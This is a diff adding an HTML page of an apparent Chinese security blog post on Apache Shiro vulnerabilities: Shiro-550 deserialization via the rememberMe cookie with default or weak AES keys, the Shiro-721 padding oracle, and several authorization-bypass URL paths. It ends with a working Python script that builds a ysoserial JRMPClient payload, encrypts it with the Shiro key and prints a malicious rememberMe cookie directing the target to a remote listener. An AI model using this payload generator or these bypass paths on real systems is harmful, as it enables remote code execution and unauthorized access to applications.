@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>shiro漏洞 | 心蟠实验室</title>
+    
+    
+        <meta property="og:site_name" content="心蟠实验室">
+    
+    
+        <meta property="article:author" content="hongzh0">
+    
+    
+        <link rel="icon" href="/img/favicon.ico">
+    
+    
+<link rel="stylesheet" href="/css/minireset.min.css">
+
+    
+<link rel="stylesheet" href="/css/all.min.css">
+
+    
+<link rel="stylesheet" href="/css/csshake.min.css">
+
+    
+<link rel="stylesheet" href="/css/hljs/lioshi.css">
+
+    
+<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+
+    
+<link rel="stylesheet" href="/styl/main.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/jquery.fancybox.min.js"></script>
+
+    
+<script src="/js/clipboard.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <header>
+  <div class="outer">
+    <div class="inner">
+      <h1 class="logo-wrap">
+        <a>心蟠实验室<b><sup></sup></b></a>
+      </h1>
+    </div>
+    <div class="inner">
+      <nav class="main-nav">
+        
+          <a href="/">首页</a>
+        
+          <a href="/archives">归档</a>
+        
+          <a href="/chigua">网安圈</a>
+        
+          <a href="/about">简历</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+    <div class="content">
+        <section class="outer">
+    <article>
+        <div class="article-title">
+    <h2><a href="/2025/02/03/shiro/" class="shake shake-little" title="shiro漏洞">shiro漏洞</a></h2>
+    <div class="meta_box">
+    
+        
+        
+            
+        
+        
+        <div class="meta meta_auth">
+            <img src="/img/hongzh0.png" alt="head" />
+            <p>hongzh0</p>
+        </div>
+    
+        
+        
+        <div class="meta meta_date">
+            <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+            <p>发布于：2025年02月03日</p>
+        </div>
+    
+        <div class="meta meta_update">
+            <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+            <p>更新于：2025年02月04日</p>
+        </div>
+    </div>
+    
+  <div class="post_tags">
+    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>java</a></li></ul>
+  </div>
+
+
+</div>
+
+        <hr>
+        <div class="article-entry">
+            
+            
+            
+            <h3 id="shiro-550"><a href="#shiro-550" class="headerlink" title="shiro-550"></a>shiro-550</h3><h4 id="RCE流程"><a href="#RCE流程" class="headerlink" title="RCE流程"></a>RCE流程</h4><p>提取cookie-&gt;Base64解码-&gt;AES解密-&gt;反序列化</p>
+<p>漏洞点就在于这个AES的key，如果用的是默认key或者是弱密码，可以直接利用或者是爆破出来</p>
+<p>如何判断爆破成功没有呢，看返回包的cookie，如果出现Remember-Me&#x3D;Delete-Me,就是爆破失败，反之成功</p>
+<p>但其实Remember-Me这玩意不一定非得叫Remember-Me，可以改的，在ShiroConfiguration.java文件里可以改动的</p>
+<p><img src="https://pic1.imgdb.cn/item/67a0e953d0e0a243d4f9feb2.png"></p>
+<h3 id="shiro-721"><a href="#shiro-721" class="headerlink" title="shiro-721"></a>shiro-721</h3><p>shiro721中，密钥的生成方式变为了动态生成，前后对比源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public AbstractRememberMeManager() &#123;</span><br><span class="line">        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        this.cipherService = new AesCipherService();</span><br><span class="line">        setCipherKey(**DEFAULT_CIPHER_KEY_BYTES**);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public AbstractRememberMeManager() &#123;</span><br><span class="line">        this.serializer = new DefaultSerializer&lt;PrincipalCollection&gt;();</span><br><span class="line">        AesCipherService cipherService = new AesCipherService();</span><br><span class="line">        this.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="RCE流程-1"><a href="#RCE流程-1" class="headerlink" title="RCE流程"></a>RCE流程</h4><ul>
+<li>输入正确账号密码登录，勾选Remember，并从cookie中拿到Remember-Me的值</li>
+<li>使用rememberMe字段进行Padding Oracle Attack</li>
+<li>获取intermediary，使用rememberMe字段进行Padding Oracle Attack。</li>
+<li>最后使用新的Cookie请求网站执行攻击</li>
+</ul>
+<h4 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h4><p>这个攻击其实类似于sql盲注，这就要求服务器有咱能利用的Bool条件<br>也好办其实：</p>
+<ul>
+<li>Padding正确，服务器正常响应</li>
+<li>Padding错误，服务器返回Set-Cookie: rememberMe&#x3D;deleteMe</li>
+</ul>
+<h3 id="shiro权限绕过1"><a href="#shiro权限绕过1" class="headerlink" title="shiro权限绕过1"></a>shiro权限绕过1</h3><p>shiro在路径控制时候，没有对传入的url编码进行decode，导致攻击者可以绕过过滤器，访问被过滤的路径</p>
+<blockquote>
+<p>&#x2F;hello&#x2F;1    需登录</br><br>版本：Shiro ≤ 1.4.2</br><br>&#x2F;hello&#x2F;1&#x2F;可绕过</br><br>版本：Shiro ≤ 1.5.1</br><br>&#x2F;asdf&#x2F;..;&#x2F;hello&#x2F;1可绕过</br><br>测试环境使用1.4.2版本</br></p>
+</blockquote>
+<h3 id="shiro权限绕过2"><a href="#shiro权限绕过2" class="headerlink" title="shiro权限绕过2"></a>shiro权限绕过2</h3><p>该漏洞是因为springboot和shiro处理不一致导致的认证绕过</p>
+<p>org.apache.shiro.web.util.Webutils#getPathWithinApplication获取到的是&#x2F;admin&#x2F;;page，然后<br>将;page作为一整个字符串，匹配&#x2F;admin&#x2F;{name}路由，导致越权</p>
+<h3 id="shiro权限绕过3"><a href="#shiro权限绕过3" class="headerlink" title="shiro权限绕过3"></a>shiro权限绕过3</h3><p>这个是因为tokenizeToStringArray方法里德trimTokens参数默认为true，空格会经过trim处理被清除，再次返回getChain时候最后面的&#x2F;被清除，导致&#x2F;admin与&#x2F;admin&#x2F;*匹配失败导致权限绕过</p>
+<p>&#x2F;admin&#x2F;%20</p>
+<h3 id="shiro权限绕过4"><a href="#shiro权限绕过4" class="headerlink" title="shiro权限绕过4"></a>shiro权限绕过4</h3><p>当用户输入&#x2F;;&#x2F;account时候，org&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;util&#x2F;WebUtils.java里的normalize方法会将;后面进行截取，截取之后后边方法再错误处理导致的权限绕过</p>
+<p><img src="https://pic1.imgdb.cn/item/67a0eb9dd0e0a243d4fa0821.png"></p>
+<h3 id="长度绕过"><a href="#长度绕过" class="headerlink" title="长度绕过"></a>长度绕过</h3><p>JRMP、短利用链、块请求(请求走私不到行不行，哪天我试试</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import subprocess</span><br><span class="line">import requests</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def encode_rememberme(command):</span><br><span class="line">  popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, </span><br><span class="line">command], stdout=subprocess.PIPE)</span><br><span class="line">  BS = AES.block_size</span><br><span class="line">  pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">  key = &quot;输入shiroAES密钥&quot;</span><br><span class="line">  mode = AES.MODE_CBC</span><br><span class="line">  iv = uuid.uuid4().bytes</span><br><span class="line">  encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">  file_body = pad(popen.stdout.read())</span><br><span class="line">  base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">  return base64_rememberMe_value</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  payload = encode_rememberme(&#x27;192.168.1.5:1234&#x27;) #这里替换远程主机的ip和JRMP监听模块</span><br><span class="line">监听的端口</span><br><span class="line">  print(&quot;rememberMe=&#123;&#125;&quot;.format(payload.decode()))</span><br></pre></td></tr></table></figure>
+        </div>
+        <div class="article-copyright">
+            
+    <blockquote>
+        <p>
+            版权声明：本文由「hongzh0」原创，博客内容受知识共享协议（CC BY-NC-SA）保护，允许在署名的前提下进行非商业性使用，并以相同方式共享。本文永久链接地址：http://hongzh0.wiki/2025/02/03/shiro/
+        </p>
+    </blockquote>
+
+
+        </div>
+    </article>
+    
+
+    <section id="toc-div" >
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-550"><span class="toc-number">1.</span> <span class="toc-text">shiro-550</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">RCE流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-721"><span class="toc-number">2.</span> <span class="toc-text">shiro-721</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RCE%E6%B5%81%E7%A8%8B-1"><span class="toc-number">2.1.</span> <span class="toc-text">RCE流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Padding-Oracle-Attack"><span class="toc-number">2.2.</span> <span class="toc-text">Padding Oracle Attack</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%871"><span class="toc-number">3.</span> <span class="toc-text">shiro权限绕过1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%872"><span class="toc-number">4.</span> <span class="toc-text">shiro权限绕过2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%873"><span class="toc-number">5.</span> <span class="toc-text">shiro权限绕过3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%874"><span class="toc-number">6.</span> <span class="toc-text">shiro权限绕过4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">长度绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">8.</span> <span class="toc-text">payload</span></a></li></ol>
+    </section>
+    <section id="gohome" style="display: none;"><a>顶</a></section>
+
+    <script>
+        function get_top_by_link(link){
+            var hnid = "#" + $(link).attr("data");
+            if ($(hnid).length > 0){
+                return $(hnid).offset().top;
+            }else{
+                return 0;
+            }
+        }
+        //go to hn
+        function gotohn(link){
+            $("html,body").animate({scrollTop: get_top_by_link(link) }, 300);
+        }
+        //页面滚动
+        function update(){
+            var scrollH = $(window).scrollTop();
+            if($(".toc-link")){
+                $(".toc-link").each(function(i,link){
+                    var mdHeight = get_top_by_link(link);
+                    if(mdHeight < scrollH + 50){
+                        //高亮导航菜单
+                        $('.toc-link').removeClass('on');
+                        $(link).addClass('on');
+                    }
+                });
+            }
+            if(scrollH < 200){
+                $("#gohome").css("display","none");
+            }else{
+                $("#gohome").css("display","block");
+            }
+        }
+        $(function(){
+            //修复部分锚点从属关系
+            if($("#toc-div >li").length > 0){
+                $("#toc-div >li").appendTo($("#toc-div >ol:first"));
+            }
+            //返回顶部
+            $('#gohome').click(function(){
+                $("html,body").animate({scrollTop: 0}, 300);
+                return false;
+            })
+            //遍历锚点
+            $(".toc-link").each(function(i,link){
+                $(link).attr("data",$(link).attr('href').substring(1));
+                $(link).attr("href","javascript:void(0);");
+                $(link).attr("onclick","gotohn(this);");
+            })
+            //绑定滚动事件
+            $(window).bind('scroll', update);
+            //初始化toc
+            var first_toc = $(".toc-link")[0];
+            var first_scroll = get_top_by_link(first_toc);
+            var window_scroll = $(window).scrollTop();
+            if(window_scroll <= first_scroll){
+                $(first_toc).addClass('on');
+            }
+        })
+    </script>
+
+</section>
+    </div>
+    <footer>
+    <div class="outer">
+        <div class="inner">
+            Powered by <a href="http://prowiki.demopage.icu/" target="_blank">ProWiki</a>
+            &copy;2025 hongzh0<br>
+            <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"></a>
+        </div>
+    </div>
+</footer>
+
+<script src="/js/custom.js"></script>
+
+
+    <script>onload_content();</script>
+
+</body>
+</html>
